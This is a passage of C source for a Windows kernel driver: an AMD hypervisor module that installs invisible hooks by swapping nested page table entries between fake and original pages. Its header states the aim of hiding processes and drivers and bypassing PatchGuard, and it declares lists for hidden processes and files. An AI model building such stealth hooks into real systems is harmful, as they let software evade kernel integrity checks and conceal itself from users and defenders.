/*
 * NptHook.c
 * 
 * AMD NPT Hook 模块实现
 * 
 * 功能：
 *   - 使用 NPT 分页欺骗实现隐身 Hook
 *   - 支持隐藏进程、驱动（绕过 PatchGuard）
 * 
 * 注意：
 *   - AMD NPT 不支持 Execute-Only 模式
 *   - 使用双页面策略：FakePage (执行) / OriginalPage (读取)
 *   - 通过 #DB 单步异常实现状态恢复
 */

#include "NptHook.h"
#include "SimpleHypervisor.h"
#include "HvTypes.h"
#include "HvCompat.h"
#include "HvLde.h"
#include <ntstrsafe.h>

// P122: 全 driver DbgPrint → GUI ring
#define HV_TRACE_THIS_CAT HV_TRACE_CAT_NPT
#include "HvTrace.h"

// ============================================================
// 全局变量
// ============================================================

NPT_HOOK_MANAGER g_NptHookManager = { 0 };

// NPT 版本号：每次修改 NPT PTE 时递增
volatile LONG64 g_NptVersion = 0;

// 每个 CPU 上次看到的 NPT 版本号
static volatile LONG64 g_LastNptVersion[64] = { 0 };

// 标记是否在 SVM root 模式
volatile BOOLEAN g_InSvmRootMode = FALSE;

// 隐藏进程列表
#define MAX_HIDDEN_PROCESSES 16
static ULONG g_NptHiddenProcessIds[MAX_HIDDEN_PROCESSES] = { 0 };
static ULONG g_NptHiddenProcessCount = 0;
static KSPIN_LOCK g_NptHiddenProcessLock;

// 前向声明：文件隐藏相关全局变量
#define MAX_NPT_HIDDEN_FILES 32
#define MAX_NPT_FILE_NAME_LEN 256
static WCHAR g_NptHiddenFileNames[MAX_NPT_HIDDEN_FILES][MAX_NPT_FILE_NAME_LEN];
static ULONG g_NptHiddenFileCount;
static KSPIN_LOCK g_NptHiddenFileLock;
static volatile LONG g_NptHiddenFileLockInit;

// x64 跳转指令模板 (jmp [rip+0])
static const UCHAR NptJmpTemplate[] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp qword ptr [rip+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // 地址占位符
};
#define NPT_JMP_SIZE 14

// KLDR_DATA_TABLE_ENTRY 已在 HvTypes.h 中定义

// ============================================================
// 内部函数声明
// ============================================================

PNPT_PTE
NptGetPteForPhysicalAddress(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress
);

static PNPT_PTE
NptGetOrCreatePteForHook(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress
);

static NTSTATUS
NptCreateFakePage(
    _In_ PNPT_HOOK_ENTRY HookEntry
);

static NTSTATUS
NptCreateTrampoline(
    _In_ PNPT_HOOK_ENTRY HookEntry
);

static VOID
NptSwitchToFakePage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PNPT_HOOK_ENTRY HookEntry
);

static VOID
NptSwitchToOriginalPage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PNPT_HOOK_ENTRY HookEntry
);

static PNPT_HOOK_ENTRY
NptHookFindByPhysicalAddressNoLock(
    _In_ ULONG64 PhysicalAddress
);

// ============================================================
// 多 CPU NPT TLB 同步
// ============================================================

/*
 * 增加 NPT 版本号
 */
static VOID
NptIncrementVersion(VOID)
{
    InterlockedIncrement64((volatile LONG64*)&g_NptVersion);
}

/*
 * 刷新 NPT TLB —— 全核版本
 *
 * 原实现只设当前 CPU 的 VMCB.TlbControl,导致其他 VCPU 持续命中旧 NPT TLB,
 * hook 跨核迁移时随机失效。现在递增版本号 + 遍历所有 VCPU 写各自的 VMCB,
 * 任一核下次 VMRUN 时即刷其 NPT TLB。错过本轮的核也会在下次 VM Exit 时
 * 通过 NptCheckAndInvalidateTlb 比对版本号自救。
 *
 * VcpuData 参数保留作向后兼容,但现已忽略 —— 我们刷的是全部 VCPU。
 */
static VOID
NptInvalidateTlb(PVCPU_DATA VcpuData)
{
    UNREFERENCED_PARAMETER(VcpuData);

    ULONG cpuIndex = KeGetCurrentProcessorNumber();
    if (cpuIndex >= 64) cpuIndex = 0;

    NptIncrementVersion();

    // 遍历所有 VCPU,把它们各自 VMCB 的 TlbControl 标记为 FLUSH_GUEST。
    // VMCB 内存是 NonPaged,跨核写不需要 IPI;下次每核 VMRUN 时硬件自动刷。
    if (g_HypervisorContext.IsActive) {
        ULONG count = g_HypervisorContext.ProcessorCount;
        if (count == 0 || count > 64) count = 1;
        for (ULONG i = 0; i < count; i++) {
            PVCPU_DATA v = &g_HypervisorContext.VcpuData[i];
            if (v && v->Vmcb) {
                v->Vmcb->ControlArea.TlbControl = SVM_TLB_CONTROL_FLUSH_GUEST;
            }
        }
    }

    g_LastNptVersion[cpuIndex] = g_NptVersion;
}

/*
 * 检查并刷新 NPT TLB
 */
VOID
NptCheckAndInvalidateTlb(PVCPU_DATA VcpuData)
{
    ULONG cpuIndex = KeGetCurrentProcessorNumber();
    LONG64 currentVersion;
    
    if (cpuIndex >= 64) cpuIndex = 0;
    
    currentVersion = g_NptVersion;
    
    if (g_LastNptVersion[cpuIndex] != currentVersion) {
        // NPT 已被修改，需要刷新
        if (VcpuData && VcpuData->Vmcb) {
            VcpuData->Vmcb->ControlArea.TlbControl = SVM_TLB_CONTROL_FLUSH_GUEST;
        }
        g_LastNptVersion[cpuIndex] = currentVersion;
    }
}

/*
 * 设置 SVM root 模式标志
 */
VOID NptSetSvmRootMode(BOOLEAN InRootMode)
{
    g_InSvmRootMode = InRootMode;
}

// ============================================================
// 指令长度解码器（与 EPT Hook 共享 - 2026-06-16 方案 A 改用 HvLde.c）
// ============================================================

/*
 * 获取单条 x64 指令的长度 — 共享解码器 wrapper
 */
static ULONG
NptGetInstructionLength(
    _In_ PUCHAR Code
)
{
    HV_INST_INFO info;
    if (!HvLdeDecode(Code, &info)) return 0;
    return info.Length;
}

/*
 * 计算跳板大小
 */
static ULONG
NptCalculateTrampolineSize(
    _In_ PUCHAR Code,
    _In_ ULONG MinBytes
)
{
    ULONG totalLength = 0;
    ULONG instLength;
    ULONG maxInstructions = 10;
    
    while (totalLength < MinBytes && maxInstructions > 0) {
        instLength = NptGetInstructionLength(Code + totalLength);
        
        if (instLength == 0) {
            // 无法解码 —— 返回 0,绝不强写 NPT_JMP_SIZE 字节切到指令中间。
            DbgPrint("[NPT-Hook] Failed to decode instruction at offset %d\n", totalLength);
            return 0;
        }
        
        totalLength += instLength;
        maxInstructions--;
    }
    
    DbgPrint("[NPT-Hook] Trampoline size: %d bytes (min: %d)\n", totalLength, MinBytes);
    return totalLength;
}

// ============================================================
// NPT 打印信息
// ============================================================

VOID
NptPrintInfo(VOID)
{
    ULONG cpuIndex;
    
    DbgPrint("[NPT-Hook] ========== NPT Structure Info ==========\n");
    
    if (!g_HypervisorContext.IsActive) {
        DbgPrint("[NPT-Hook] Hypervisor is not active\n");
        DbgPrint("[NPT-Hook] =====================================\n");
        return;
    }
    
    if (g_HypervisorContext.VcpuData) {
        cpuIndex = KeGetCurrentProcessorNumber();
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        
        DbgPrint("[NPT-Hook] CPU %d VcpuData:\n", cpuIndex);
        
        if (vcpuData->NptTables) {
            PNPT_TABLES nptTables = vcpuData->NptTables;
            ULONG64 pml4Pa = nptTables->Pml4Physical.QuadPart;
            ULONG validPml4Count = 0;
            ULONG validPdptCount = 0;
            ULONG i;
            
            for (i = 0; i < 512; i++) {
                if (nptTables->Pml4[i].Present) {
                    validPml4Count++;
                }
                if (nptTables->Pdpt[i].Present) {
                    validPdptCount++;
                }
            }
            
            DbgPrint("[NPT-Hook]   NptTables VA: %p\n", nptTables);
            DbgPrint("[NPT-Hook]   PML4 Physical: 0x%llx\n", pml4Pa);
            DbgPrint("[NPT-Hook]   Valid PML4 entries: %d\n", validPml4Count);
            DbgPrint("[NPT-Hook]   Valid PDPT entries: %d\n", validPdptCount);
            DbgPrint("[NPT-Hook]   Split PT count: %d\n", nptTables->SplitPtCount);
        } else {
            DbgPrint("[NPT-Hook]   NptTables: NULL (NPT not configured)\n");
        }
        
        if (vcpuData->Vmcb) {
            DbgPrint("[NPT-Hook]   VMCB: %p (NPT enabled: %d)\n", 
                vcpuData->Vmcb, 
                (vcpuData->Vmcb->ControlArea.NpEnable & 1) != 0);
        }
    }
    
    DbgPrint("[NPT-Hook] =====================================\n");
}

BOOLEAN
NptIsConfigured(VOID)
{
    if (!g_HypervisorContext.IsActive) {
        return FALSE;
    }
    
    if (g_HypervisorContext.VcpuData) {
        ULONG cpuIndex = KeGetCurrentProcessorNumber();
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        
        if (vcpuData->NptTables && vcpuData->Vmcb) {
            return (vcpuData->Vmcb->ControlArea.NpEnable & 1) != 0;
        }
    }
    
    return FALSE;
}

// ============================================================
// 检查 NX 支持
// ============================================================

static BOOLEAN
NptIsNxSupported(VOID)
{
    int cpuInfo[4];
    ULONG64 efer;
    
    // 检查 CPUID.80000001H:EDX[20] = NX bit
    __cpuid(cpuInfo, 0x80000001);
    if (!(cpuInfo[3] & (1 << 20))) {
        DbgPrint("[NPT-Hook] CPU does not support NX bit\n");
        return FALSE;
    }
    
    // 检查 EFER.NXE
    efer = __readmsr(MSR_IA32_EFER);
    if (!(efer & EFER_NXE)) {
        DbgPrint("[NPT-Hook] EFER.NXE not enabled\n");
        return FALSE;
    }
    
    DbgPrint("[NPT-Hook] NX support confirmed\n");
    return TRUE;
}

// ============================================================
// 初始化和清理
// ============================================================

NTSTATUS
NptHookInitialize(VOID)
{
    PHYSICAL_ADDRESS maxAddr;
    
    if (g_NptHookManager.Initialized) {
        return STATUS_SUCCESS;
    }
    
    DbgPrint("[NPT-Hook] Initializing NPT Hook Manager...\n");
    
    // 初始化链表
    InitializeListHead(&g_NptHookManager.HookList);
    g_NptHookManager.HookCount = 0;
    
    // 初始化自旋锁
    KeInitializeSpinLock(&g_NptHookManager.Lock);
    
    // 初始化隐藏进程列表
    KeInitializeSpinLock(&g_NptHiddenProcessLock);
    g_NptHiddenProcessCount = 0;
    RtlZeroMemory(g_NptHiddenProcessIds, sizeof(g_NptHiddenProcessIds));
    
    // 初始化文件隐藏锁（提前初始化以避免运行时竞态条件）
    KeInitializeSpinLock(&g_NptHiddenFileLock);
    InterlockedExchange(&g_NptHiddenFileLockInit, TRUE);
    g_NptHiddenFileCount = 0;
    RtlZeroMemory(g_NptHiddenFileNames, sizeof(g_NptHiddenFileNames));
    
    // 检查 NX 支持
    g_NptHookManager.NxSupported = NptIsNxSupported();
    DbgPrint("[NPT-Hook] NX support: %s\n",
        g_NptHookManager.NxSupported ? "YES" : "NO");
    
    // 初始化单步上下文
    RtlZeroMemory(g_NptHookManager.StepContext, sizeof(g_NptHookManager.StepContext));
    
    // 分配跳板池
    // TODO 2026-06-19: 跟 EptHook 一样, AMD 路径也可能受 RIP-rel disp32 超距溢出影响,
    // 应改用 driver image 内嵌静态可执行 section (见 EptHook.c g_StaticTrampolinePool)。
    // 暂留 ExAllocatePool 用法, 等真机验证 AMD 路径是否需要再改。
    g_NptHookManager.TrampolinePool = HvAllocateNonPagedExecute(
        PAGE_SIZE_4KB * 4,
        NPT_HOOK_TAG
    );
    
    if (!g_NptHookManager.TrampolinePool) {
        DbgPrint("[NPT-Hook] Failed to allocate trampoline pool\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // 2026-05-21 镜像 EptHook 修复:不要 ZeroMemory,改 INT3 fill。
    //   0x00 = ADD [RAX],AL → 走错落空区立刻 AV 无受控陷阱;
    //   0xCC = INT3 → #BP → 受控 KeBugCheckEx 有 dump。
    RtlFillMemory(g_NptHookManager.TrampolinePool, PAGE_SIZE_4KB * 4, 0xCC);
    g_NptHookManager.TrampolinePoolPhysical =
        MmGetPhysicalAddress(g_NptHookManager.TrampolinePool).QuadPart;
    g_NptHookManager.TrampolinePoolUsed = 0;
    
    g_NptHookManager.Initialized = TRUE;
    
    DbgPrint("[NPT-Hook] NPT Hook Manager initialized\n");
    DbgPrint("[NPT-Hook] Trampoline Pool: VA=%p PA=0x%llx\n",
        g_NptHookManager.TrampolinePool,
        g_NptHookManager.TrampolinePoolPhysical);
    
    NptPrintInfo();
    
    return STATUS_SUCCESS;
}

VOID
NptHookCleanup(VOID)
{
    KIRQL oldIrql;
    PVOID trampolinePool = NULL;
    
    if (!g_NptHookManager.Initialized) {
        return;
    }
    
    DbgPrint("[NPT-Hook] Cleaning up NPT Hook Manager...\n");
    
    NptHookRemoveAll();
    
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    
    trampolinePool = g_NptHookManager.TrampolinePool;
    g_NptHookManager.TrampolinePool = NULL;
    g_NptHookManager.Initialized = FALSE;
    
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    
    if (trampolinePool) {
        ExFreePoolWithTag(trampolinePool, NPT_HOOK_TAG);
    }
    
    DbgPrint("[NPT-Hook] NPT Hook Manager cleaned up\n");
}

// ============================================================
// NPT PTE 操作
// ============================================================

/*
 * 获取指定物理地址的 NPT PTE
 *
 * 安全约束: 仅处理 PML4[0] (PA < 512GB) 的低 4KB PTE.
 * PML4[1..3] (>= 512GB) 当 HV_ENABLE_SVM_HARDENING=1 时映射为 1GB 大页, 无 PTE 层级,
 * 直接返回 NULL → 让 NPF fallback 走"大页 RWX"路径而不是错写 Pd[0..511][0..511].
 *
 * 历史 bug (修复前): 没有 PML4 索引计算, PA >= 512GB 时 (PA>>30)&0x1FF 仍 0-511 但
 * 实际溢出, 错误索引 nptTables->Pd[][] 返回不相干的低位 PTE → 静默错误.
 */
PNPT_PTE
NptGetPteForPhysicalAddress(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress
)
{
    ULONG64 pml4Index, pdptIndex, pdIndex, ptIndex;
    PNPT_TABLES nptTables;
    NPT_PDE* pde;
    PNPT_PTE ptPage;
    PHYSICAL_ADDRESS ptPhys;

    if (!VcpuData || !VcpuData->NptTables) {
        return NULL;
    }

    nptTables = VcpuData->NptTables;

    // 拒绝 PML4[1..3] 范围 (>=512GB), 那里是 1GB 大页(或未映射), 无 PTE 层级
    pml4Index = (PhysicalAddress >> 39) & 0x1FFu;
    if (pml4Index != 0) {
        return NULL;
    }

    // 计算 PML4[0] 内的索引
    pdptIndex = (PhysicalAddress >> 30) & 0x1FF;
    pdIndex = (PhysicalAddress >> 21) & 0x1FF;
    ptIndex = (PhysicalAddress >> 12) & 0x1FF;

    // 获取 PDE
    pde = &nptTables->Pd[pdptIndex][pdIndex];

    if (!pde->Large.Present) {
        return NULL;
    }

    // 检查是否为 2MB 大页
    if (pde->Large.LargePage) {
        // 大页不能直接返回 PTE，需要先分割
        return NULL;
    }

    // 获取 PT 物理地址
    ptPhys.QuadPart = (LONGLONG)(pde->Small.PageFrameNumber << 12);
    ptPage = (PNPT_PTE)MmGetVirtualForPhysical(ptPhys);

    if (!ptPage) {
        return NULL;
    }

    return &ptPage[ptIndex];
}

/*
 * 获取或创建 4KB PTE（必要时分割大页）
 */
static PNPT_PTE
NptGetOrCreatePteForHook(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress
)
{
    ULONG64 pdptIndex, pdIndex, ptIndex;
    PNPT_TABLES nptTables;
    NPT_PDE* pde;
    NTSTATUS status;
    
    if (!VcpuData || !VcpuData->NptTables) {
        return NULL;
    }
    
    nptTables = VcpuData->NptTables;
    
    pdptIndex = (PhysicalAddress >> 30) & 0x1FF;
    pdIndex = (PhysicalAddress >> 21) & 0x1FF;
    ptIndex = (PhysicalAddress >> 12) & 0x1FF;
    
    pde = &nptTables->Pd[pdptIndex][pdIndex];
    
    if (!pde->Large.Present) {
        DbgPrint("[NPT-Hook] PDE not present for PA 0x%llx\n", PhysicalAddress);
        return NULL;
    }
    
    // 如果是大页，需要分割
    if (pde->Large.LargePage) {
        status = SvmSplitNptLargePage(VcpuData, PhysicalAddress);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] Failed to split large page: 0x%X\n", status);
            return NULL;
        }
    }
    
    return NptGetPteForPhysicalAddress(VcpuData, PhysicalAddress);
}

// ============================================================
// Hook 安装
// ============================================================

NTSTATUS
NptHookInstall(
    _In_ PVOID TargetAddress,
    _In_ PVOID HookFunction,
    _Out_opt_ PNPT_HOOK_ENTRY* OutHookEntry
)
{
    NTSTATUS status;
    PNPT_HOOK_ENTRY hookEntry = NULL;
    PHYSICAL_ADDRESS targetPa;
    KIRQL oldIrql;
    ULONG cpuIndex;
    PVCPU_DATA vcpuData;
    
    if (!g_NptHookManager.Initialized) {
        DbgPrint("[NPT-Hook] Hook Manager not initialized\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    if (!TargetAddress || !HookFunction) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 检查 Hypervisor 状态
    if (!g_HypervisorContext.IsActive || !g_HypervisorContext.VcpuData) {
        DbgPrint("[NPT-Hook] Hypervisor not active\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    cpuIndex = KeGetCurrentProcessorNumber();
    vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
    
    if (!vcpuData->NptTables) {
        DbgPrint("[NPT-Hook] NPT not configured\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    // 检查是否已 Hook
    if (NptHookFindByVirtualAddress(TargetAddress)) {
        DbgPrint("[NPT-Hook] Address %p already hooked\n", TargetAddress);
        return STATUS_ALREADY_REGISTERED;
    }
    
    if (g_NptHookManager.HookCount >= MAX_NPT_HOOKS) {
        DbgPrint("[NPT-Hook] Maximum hooks reached\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    DbgPrint("[NPT-Hook] Installing hook at %p -> %p\n", TargetAddress, HookFunction);
    
    // 分配 Hook 条目
    hookEntry = (PNPT_HOOK_ENTRY)HvAllocateNonPagedZeroed(
        sizeof(NPT_HOOK_ENTRY),
        NPT_HOOK_TAG
    );
    
    if (!hookEntry) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // 获取目标物理地址
    targetPa = MmGetPhysicalAddress(TargetAddress);
    if (targetPa.QuadPart == 0) {
        DbgPrint("[NPT-Hook] Failed to get physical address for %p\n", TargetAddress);
        ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
        return STATUS_INVALID_ADDRESS;
    }
    
    // 填充 Hook 条目
    hookEntry->TargetVirtualAddress = TargetAddress;
    hookEntry->TargetPhysicalAddress = targetPa.QuadPart & PAGE_MASK;
    hookEntry->OffsetInPage = (ULONG)(targetPa.QuadPart & 0xFFF);
    hookEntry->HookFunction = HookFunction;
    hookEntry->Type = NptHookTypeInline;
    hookEntry->State = NptHookStateInactive;
    
    // 为所有 CPU 创建/分割 4KB 页
    {
        ULONG i;
        for (i = 0; i < g_HypervisorContext.ProcessorCount; i++) {
            PVCPU_DATA cpuVcpu = &g_HypervisorContext.VcpuData[i];
            if (cpuVcpu->NptTables) {
                PNPT_PTE pte = NptGetOrCreatePteForHook(cpuVcpu, hookEntry->TargetPhysicalAddress);
                if (!pte && i == cpuIndex) {
                    // 当前 CPU 失败
                    DbgPrint("[NPT-Hook] Failed to get PTE for CPU %d\n", i);
                    ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
                    return STATUS_NOT_FOUND;
                }
                if (i == cpuIndex) {
                    hookEntry->TargetPte = pte;
                }
            }
        }
    }
    
    // 打印目标函数字节
    {
        PUCHAR funcBytes = (PUCHAR)TargetAddress;
        DbgPrint("[NPT-Hook] Target function bytes:\n");
        DbgPrint("[NPT-Hook]   %02X %02X %02X %02X %02X %02X %02X %02X\n",
            funcBytes[0], funcBytes[1], funcBytes[2], funcBytes[3],
            funcBytes[4], funcBytes[5], funcBytes[6], funcBytes[7]);
    }
    
#if NPT_HOOK_SIMPLE_MODE
    {
        RtlCopyMemory(hookEntry->OriginalBytes, TargetAddress, NPT_JMP_SIZE);
        hookEntry->OriginalBytesLength = NPT_JMP_SIZE;
    }
#else
    {
        ULONG bytesToCopy = NptCalculateTrampolineSize((PUCHAR)TargetAddress, NPT_JMP_SIZE);

        // 严格拒装,见 EPT 侧 #21 注释。
        if (bytesToCopy < NPT_JMP_SIZE || bytesToCopy > sizeof(hookEntry->OriginalBytes)) {
            DbgPrint("[NPT-Hook] Refusing to install: unsafe trampoline size %d (need %d..%llu)\n",
                     bytesToCopy, (int)NPT_JMP_SIZE, (ULONG64)sizeof(hookEntry->OriginalBytes));
            ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
            return STATUS_INVALID_PARAMETER;
        }

        RtlCopyMemory(hookEntry->OriginalBytes, TargetAddress, bytesToCopy);
        hookEntry->OriginalBytesLength = bytesToCopy;
    }
#endif
    
    // 创建伪造页
    status = NptCreateFakePage(hookEntry);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[NPT-Hook] Failed to create fake page: 0x%X\n", status);
        ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
        return status;
    }
    
    // 创建跳板 + 加入链表 — 整体进 spinlock 保护(镜像 EptHook.c 2026-06-16 修复)。
    // NptCreateTrampoline 内部 bump TrampolinePoolUsed 之前没锁,多个 hook 并发装载时会 race。
    // 移到锁内同时保证 (a) trampoline 槽位分配原子 (b) 链表插入与槽位分配作为一个完整事务。
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    status = NptCreateTrampoline(hookEntry);
    if (!NT_SUCCESS(status)) {
        KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
        DbgPrint("[NPT-Hook] Failed to create trampoline: 0x%X\n", status);
        if (hookEntry->FakePageVirtual) {
            MmFreeContiguousMemory(hookEntry->FakePageVirtual);
        }
        ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
        return status;
    }

    InsertTailList(&g_NptHookManager.HookList, &hookEntry->ListEntry);
    g_NptHookManager.HookCount++;
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    
    // 激活 Hook - 在所有 CPU 上修改 NPT
    // AMD NPT 策略：指向 FakePage，P=1, W=1, NX=0（允许执行）
    // FakePage 包含 JMP 到 Hook 函数，执行时自动跳转
    {
        ULONG i;
        for (i = 0; i < g_HypervisorContext.ProcessorCount; i++) {
            PVCPU_DATA cpuVcpu = &g_HypervisorContext.VcpuData[i];
            if (cpuVcpu->NptTables) {
                PNPT_PTE pte = NptGetPteForPhysicalAddress(cpuVcpu, hookEntry->TargetPhysicalAddress);
                if (pte) {
                    // 指向 FakePage，允许执行
                    pte->PageFrameNumber = hookEntry->FakePagePhysical >> 12;
                    pte->Present = 1;
                    pte->Write = 1;
                    pte->NoExecute = 0;  // 允许执行
                    
                    NptInvalidateTlb(cpuVcpu);
                }
            }
        }
    }
    
    hookEntry->State = NptHookStateActive;
    
    DbgPrint("[NPT-Hook] Hook installed successfully\n");
    DbgPrint("[NPT-Hook]   Target VA: %p\n", hookEntry->TargetVirtualAddress);
    DbgPrint("[NPT-Hook]   Target PA: 0x%llx\n", hookEntry->TargetPhysicalAddress);
    DbgPrint("[NPT-Hook]   Fake Page: %p (PA: 0x%llx)\n", 
        hookEntry->FakePageVirtual, hookEntry->FakePagePhysical);
    DbgPrint("[NPT-Hook]   Trampoline: %p\n", hookEntry->TrampolineAddress);
    
    if (OutHookEntry) {
        *OutHookEntry = hookEntry;
    }
    
    return STATUS_SUCCESS;
}

// ============================================================
// Hook 移除
// ============================================================

NTSTATUS
NptHookRemove(
    _In_ PNPT_HOOK_ENTRY HookEntry
)
{
    KIRQL oldIrql;
    ULONG i;
    ULONG retryCount;
    
    if (!HookEntry) {
        return STATUS_INVALID_PARAMETER;
    }
    
    DbgPrint("[NPT-Hook] Removing hook at %p\n", HookEntry->TargetVirtualAddress);
    
    // 先将 Hook 标记为 Inactive，防止新的单步引用
    HookEntry->State = NptHookStateInactive;
    MemoryBarrier();
    
    // 恢复所有 CPU 的 NPT
    for (i = 0; i < g_HypervisorContext.ProcessorCount; i++) {
        PVCPU_DATA cpuVcpu = &g_HypervisorContext.VcpuData[i];
        if (cpuVcpu->NptTables) {
            PNPT_PTE pte = NptGetPteForPhysicalAddress(cpuVcpu, HookEntry->TargetPhysicalAddress);
            if (pte) {
                // 恢复到原始页
                pte->PageFrameNumber = HookEntry->TargetPhysicalAddress >> 12;
                pte->Present = 1;
                pte->Write = 1;
                pte->NoExecute = 0;
                
                NptInvalidateTlb(cpuVcpu);
            }
        }
    }
    
    // 等待所有 CPU 的单步上下文清除对这个 Hook 的引用
    retryCount = 0;
    while (retryCount < 100) {
        BOOLEAN anyPending = FALSE;
        
        for (i = 0; i < 64; i++) {
            PNPT_STEP_CONTEXT stepCtx = &g_NptHookManager.StepContext[i];
            
            if (InterlockedCompareExchange(&stepCtx->StepActive, 0, 0) != 0) {
                MemoryBarrier();
                if (stepCtx->PendingHookEntry == HookEntry) {
                    anyPending = TRUE;
                    break;
                }
            }
        }
        
        if (!anyPending) {
            break;
        }
        
        if (KeGetCurrentIrql() <= APC_LEVEL) {
            LARGE_INTEGER delay;
            delay.QuadPart = -10000;  // 1ms
            KeDelayExecutionThread(KernelMode, FALSE, &delay);
        }
        retryCount++;
    }
    
    if (retryCount >= 100) {
        DbgPrint("[NPT-Hook] Warning: Single step still pending after timeout\n");
    }
    
    // 从链表移除
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    RemoveEntryList(&HookEntry->ListEntry);
    g_NptHookManager.HookCount--;
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    
    // 释放资源
    if (HookEntry->FakePageVirtual) {
        MmFreeContiguousMemory(HookEntry->FakePageVirtual);
        HookEntry->FakePageVirtual = NULL;
    }
    
    ExFreePoolWithTag(HookEntry, NPT_HOOK_TAG);
    
    DbgPrint("[NPT-Hook] Hook removed\n");
    
    return STATUS_SUCCESS;
}

NTSTATUS
NptHookRemoveByAddress(
    _In_ PVOID TargetAddress
)
{
    PNPT_HOOK_ENTRY hookEntry;
    
    hookEntry = NptHookFindByVirtualAddress(TargetAddress);
    if (!hookEntry) {
        return STATUS_NOT_FOUND;
    }
    
    return NptHookRemove(hookEntry);
}

VOID
NptHookRemoveAll(VOID)
{
    PLIST_ENTRY entry;
    PNPT_HOOK_ENTRY hookEntry;
    KIRQL oldIrql;
    LIST_ENTRY tempList;
    ULONG i;
    
    InitializeListHead(&tempList);
    
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    while (!IsListEmpty(&g_NptHookManager.HookList)) {
        entry = RemoveHeadList(&g_NptHookManager.HookList);
        InsertTailList(&tempList, entry);
    }
    g_NptHookManager.HookCount = 0;
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    
    while (!IsListEmpty(&tempList)) {
        entry = RemoveHeadList(&tempList);
        hookEntry = CONTAINING_RECORD(entry, NPT_HOOK_ENTRY, ListEntry);
        
        // 恢复 NPT
        if (hookEntry->State == NptHookStateActive) {
            for (i = 0; i < g_HypervisorContext.ProcessorCount; i++) {
                PVCPU_DATA cpuVcpu = &g_HypervisorContext.VcpuData[i];
                if (cpuVcpu->NptTables) {
                    PNPT_PTE pte = NptGetPteForPhysicalAddress(cpuVcpu, hookEntry->TargetPhysicalAddress);
                    if (pte) {
                        pte->PageFrameNumber = hookEntry->TargetPhysicalAddress >> 12;
                        pte->Present = 1;
                        pte->Write = 1;
                        pte->NoExecute = 0;
                    }
                }
            }
        }
        
        if (hookEntry->FakePageVirtual) {
            MmFreeContiguousMemory(hookEntry->FakePageVirtual);
        }
        ExFreePoolWithTag(hookEntry, NPT_HOOK_TAG);
    }
    
    // 刷新所有 CPU 的 TLB
    for (i = 0; i < g_HypervisorContext.ProcessorCount; i++) {
        PVCPU_DATA cpuVcpu = &g_HypervisorContext.VcpuData[i];
        if (cpuVcpu->NptTables) {
            NptInvalidateTlb(cpuVcpu);
        }
    }
    
    DbgPrint("[NPT-Hook] All hooks removed\n");
}

// ============================================================
// NPF (Nested Page Fault) 处理
// ============================================================

/*
 * 启用单步执行（通过 #DB）
 */
static VOID
NptEnableSingleStep(PVCPU_DATA VcpuData)
{
    if (VcpuData && VcpuData->Vmcb) {
        // 设置 RFLAGS.TF (Trap Flag)
        VcpuData->Vmcb->StateSaveArea.Rflags |= 0x100;
        
        // 拦截 #DB 异常
        VcpuData->Vmcb->ControlArea.InterceptExceptions |= (1 << 1);  // #DB = vector 1
    }
}

/*
 * 禁用单步执行
 */
static VOID
NptDisableSingleStep(PVCPU_DATA VcpuData)
{
    if (VcpuData && VcpuData->Vmcb) {
        // 清除 RFLAGS.TF
        VcpuData->Vmcb->StateSaveArea.Rflags &= ~0x100ULL;
        
        // 取消拦截 #DB 异常
        VcpuData->Vmcb->ControlArea.InterceptExceptions &= ~(1 << 1);
    }
}

BOOLEAN
NptHookHandleNpf(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 GuestPhysicalAddress,
    _In_ ULONG64 ErrorCode
)
{
    PNPT_HOOK_ENTRY hookEntry;
    ULONG64 pagePhysical;
    BOOLEAN isPresent;
    BOOLEAN isWrite;
    BOOLEAN isFetch;
    ULONG cpuIndex;
    PNPT_STEP_CONTEXT stepCtx;
    ULONG64 guestRip;
    BOOLEAN ripOnSamePage;
    static volatile LONG npfCount = 0;
    LONG currentNpf;
    
    // 解析错误码
    pagePhysical = GuestPhysicalAddress & PAGE_MASK;
    isPresent = (ErrorCode & NPF_PRESENT) != 0;
    isWrite = (ErrorCode & NPF_WRITE) != 0;
    isFetch = (ErrorCode & NPF_FETCH) != 0;
    
    // 查找 Hook
    hookEntry = NptHookFindByPhysicalAddressNoLock(pagePhysical);
    
    if (!hookEntry) {
        return FALSE;
    }
    
    // 验证 Hook 有效
    if (hookEntry->State != NptHookStateActive) {
        return FALSE;
    }
    
    // 获取 Guest RIP
